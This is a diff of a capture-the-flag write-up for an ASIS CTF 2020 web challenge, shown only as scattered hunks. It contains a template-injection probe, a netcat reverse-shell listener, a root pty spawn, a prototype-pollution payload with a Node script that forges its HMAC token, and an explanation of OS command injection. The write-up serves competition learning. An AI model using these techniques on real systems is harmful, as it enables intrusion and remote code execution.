@@ -2,7 +2,7 @@
 title: '[ASIS CTF 2020] The Real Server'
 published: true
 tags: [writeup, web, prototype_pollution]
-author: ishtar
+author: ishtar &&  _Rok0'sBasilisk_ && sAINT_Barber
 ---
 
 ## Challenge Description
@@ -11,15 +11,14 @@ The flag is in `the-real-server` not in `the-fake-server`.
 
 [Link](https://the-healthcheck-server.asisctf.com/)
 
-![image1.png](./images/image1.png)
-
+![image1.png](./images/image1.png)  
 Website Functionality and Interface
 
 Inspecting the response headers, we find that the server is based in Python. Therefore we checked for Template Injection vulnerabilities. 
 
 **HTTP Request:**
 
-```html
+```
 GET //ping?address={{3*3}} HTTP/1.1
 Host: the-healthcheck-server.asisctf.com
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
@@ -34,7 +33,7 @@ Connection: close
 
 **HTTP Response:**
 
-```html
+```
 HTTP/1.1 200 OK
 Server: gunicorn/20.0.4
 Date: Wed, 16 Dec 2020 20:09:39 GMT
@@ -47,7 +46,7 @@ Content-Length: 117
 
 **Getting a Reverse Shell**
 
-```html
+```
 attacker$ nc -lvnp 1312
 
 ---
@@ -63,7 +62,6 @@ Referer: https://the-healthcheck-server.asisctf.com/
 X-Requested-With: XMLHttpRequest
 DNT: 1
 Connection: close
-
 ```
 
 ```python
@@ -87,6 +85,7 @@ ping_server = "https://the-ping-server.asisctf.com/ping"
 <...>
 ```
 
+In order to spawn a PTY shell and add the key to the agent:
 ```bash
 root@02fc8cadcd26:/tmp# python -c "__import__('pty').spawn('/bin/bash')"
 
@@ -206,7 +205,6 @@ console.log(hash == givenSig);
 Indeed the signatures match which confirms that this is the correct key. 
 
 **This code is vulnerable to prototype pollution via `__proto__` class modifier.**
-
 ```jsx
 // token.js
 function setDefault(obj, template) {
@@ -333,18 +331,19 @@ app.listen(port, () => {
 });
 ```
 
-Insufficient validation is done and therefore the above code has a "blind spot" where values in the request parameter having both **tier ≥ 5** and **canLookup = true**, eventually hit the **ping** endpoint. Therefore we can pass malicious data in the **address** parameter and will not get validated against **validateIP** function. 
+Insufficient validation is performed and therefore the above code has a "blind spot" where values in the request parameter having both **tier ≥ 5** and **canLookup = true**, eventually hit the **ping** endpoint. Therefore we can pass malicious data in the **address** parameter that will not get validated against **validateIP** function. 
 
 So we need to craft a request with the following data:
 ```
 {
 	"tier": 10,
-	"account": "MISSING VALUE",
+	"account": "bm90X3Rocm93aW5nX2F3YXlfbXlfc2hvdA",
 	"__proto__": {
 		"canLookup": true
 	}
 }
 ```
+
 Although trivial, we still need to craft the hmac for this payload first. Since we have already found the hmac key in the steps above, we can use something like this in a `craftToken.js` file:
 ```javascript
 const crypto = require("crypto");
@@ -353,7 +352,7 @@ const key = "indiana....let it go";
 
 const payload = {
         "tier": 10,
-        "account": "MISSING VALUE",
+        "account": "bm90X3Rocm93aW5nX2F3YXlfbXlfc2hvdA",
         "__proto__": {
                 "canLookup": true
         }
@@ -370,7 +369,7 @@ console.log("apiToken: " + b64Payload + ":" + hash);
 
 When invoked with NodeJS (`node craftToken.js`) prints out the encoded payload to use for the apiToken parameter: `eyJ0aWVyIjoxMCwiYWNjb3VudCI6Ik1JU1NJTkcgVkFMVUUifQ==:681116a5b368253770e6af63f2ebebdfc4efd4711e3f416e467c4029c29b7a78`
 
-As the tier is >= 5 and `canLookup` is set to truw by exploiting prototype polution, the following code is then invoked:
+As the tier is >= 5 and `canLookup` is set to true by exploiting prototype pollution, the following code is then invoked:
 ```jsx
 // ping.js
 const Promise = require('bluebird');
@@ -396,4 +395,4 @@ module.exports = async function ping(address) {
 }
 ```
 
-The above code is vulnerable to OS Command Injection. Specifically, an we can provide malicious input in the **address** parameter. **execAsync** returns the results of a command run in shell, thus achieving RCE.
+The above code is vulnerable to OS Command Injection. Specifically, we can provide malicious input in the **address** parameter. **execAsync** returns the results of a command run in shell, thus achieving RCE.
